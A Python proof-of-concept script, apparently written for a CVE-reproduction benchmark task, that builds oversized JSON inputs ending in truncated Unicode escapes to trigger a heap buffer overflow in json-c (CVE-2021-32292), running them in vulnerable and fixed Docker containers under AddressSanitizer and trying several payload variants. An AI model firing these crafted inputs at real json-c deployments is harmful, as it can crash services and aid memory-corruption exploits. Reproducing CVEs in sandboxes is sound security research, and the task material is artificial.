import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC to trigger heap buffer overflow...")
    
    # El problema: necesitamos que el error ocurra EXACTAMENTE en buf[32767]
    # para que start_pos + parse_end = 32768 (fuera del buffer)
    
    # Estrategia nueva: JSON con escape sequence inválida al final
    # {"a":"AAA...\uXXXX donde \uXXXX está incompleto y causa error
    
    prefix = b'{"a":"'
    # Secuencia de escape Unicode incompleta/inválida
    # \u debe ir seguido de 4 dígitos hex, usaremos solo 3
    invalid_escape = b'\\u12'  # Falta un dígito - error en parsing
    
    # Calcular padding para llegar exactamente a 32768
    # El error debe ocurrir en el último byte leído
    padding_length = 32768 - len(prefix) - len(invalid_escape)
    
    payload = prefix + (b'A' * padding_length) + invalid_escape
    
    if len(payload) != 32768:
        print(f"ERROR: Payload is {len(payload)} bytes, expected 32768")
        sys.exit(1)
    
    with open("manual_seed.json", "wb") as f:
        f.write(payload)
    
    print(f"    Created manual_seed.json ({len(payload)} bytes)")
    print(f"    Ends with: {payload[-20:]}")
    return payload

def test_direct(service_name):
    """Test without ASan to see actual parsing behavior"""
    print(f"\n[DEBUG] Testing {service_name} behavior...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm",
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(f"    Exit code: {result.returncode}")
    print(f"    STDOUT: {result.stdout[:200] if result.stdout else '(empty)'}")
    print(f"    STDERR: {result.stderr[:500] if result.stderr else '(empty)'}")
    
    return result

def main():
    payload = generate_poc()
    
    print("\n=== Testing to see what happens ===")
    
    # Test both to see the difference
    result_vuln = test_direct("target-vuln")
    result_fixed = test_direct("target-fixed")
    
    # Check if we triggered the error path
    vuln_has_asan = "AddressSanitizer" in result_vuln.stderr
    vuln_has_error = "Failed at offset" in result_vuln.stderr
    
    fixed_has_asan = "AddressSanitizer" in result_fixed.stderr
    fixed_has_error = "Failed at offset" in result_fixed.stderr or "error at end of input" in result_fixed.stderr
    
    print("\n=== Analysis ===")
    if vuln_has_error:
        print("✓ Vulnerable version hit error path")
        if vuln_has_asan:
            print("✓ ASan detected heap overflow in vulnerable!")
        else:
            print("✗ ASan did NOT detect overflow (might be within same page)")
    else:
        print("✗ Vulnerable version did NOT hit error path")
        print("  The PoC is not causing a parse error")
        
    if fixed_has_error:
        print("✓ Fixed version hit error path")
        if not fixed_has_asan:
            print("✓ Fixed version handled error safely")
        else:
            print("✗ Fixed version also triggered ASan")
    
    print("\n=== Trying alternative PoCs ===")
    
    # Alternative 1: Truncated unicode escape at exact boundary
    alt_payloads = [
        (b'{"a":"' + b'A' * 32760 + b'\\u123', "Truncated \\u escape"),
        (b'{"a":"' + b'A' * 32761 + b'\\u12', "Shorter \\u escape"),
        (b'{"a":"' + b'A' * 32762 + b'\\u1', "Very short \\u escape"),
        (b'{"a":"' + b'A' * 32761 + b'\\xFF', "Invalid escape char"),
    ]
    
    for alt_payload, desc in alt_payloads:
        if len(alt_payload) != 32768:
            continue
        print(f"\nTrying: {desc}")
        with open("manual_seed.json", "wb") as f:
            f.write(alt_payload)
        
        result = test_direct("target-vuln")
        if "Failed at offset" in result.stderr:
            print(f"  ✓ This triggers the error path!")
            if "AddressSanitizer" in result.stderr:
                print(f"  ✓ ASan detected overflow!")
                print("\n✅ FOUND WORKING POC!")
                break

if __name__ == "__main__":
    main()